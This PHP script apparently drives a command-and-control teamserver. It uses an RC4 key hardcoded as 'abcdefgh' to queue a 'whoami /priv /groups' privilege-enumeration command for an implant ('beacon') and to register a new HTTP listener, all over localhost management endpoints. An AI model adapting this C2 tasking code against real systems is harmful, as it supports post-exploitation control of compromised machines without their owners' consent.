<?php
    // Pulling the public key from the teamserver
    // Pulling the private key from the teamserver (maybe not in struct form)

    include "php/config/config.php"; 

    include_once CRYPT_PATH . "RC4.php";
    include_once CLASSES_PATH . "base64.php";
    include_once CLASSES_PATH . "utilities.php";




    
    //send_command();
    add_listener();

    function send_command() {
        $util = new Util;
        $rc4 = new Crypt_RC4();
        $base64 = new Base64;

        $beacon_id = "504";
    
        $array = json_encode(array(
            "command" => "whoami",
            "args" => array(
                "arg1" => "/priv",
                "arg2" => "/groups"
            ),
        ));


        $encoded_json = $base64->encode($array);
        $format = "$beacon_id:$encoded_json";
        $data = sprintf($format, $beacon_id, $encoded_json);

        $rc4->setKey('abcdefgh');
        $encrypted = $rc4->encrypt($data);
        $encoded = $base64->encode($encrypted);
        $resp = $util->postRequest("http://127.0.0.1:1337/mgmt/queue", $encoded);
    }

    function add_listener() {
        $util = new Util;
        $rc4 = new Crypt_RC4();
        $base64 = new Base64;

        $data = "add:http:127.0.0.1:6000";

        $rc4->setKey('abcdefgh');
        $encrypted = $rc4->encrypt($data);
        $encoded = $base64->encode($encrypted);
        $resp = $util->postRequest("http://127.0.0.1:1337/mgmt/listener", $encoded);
    }
?>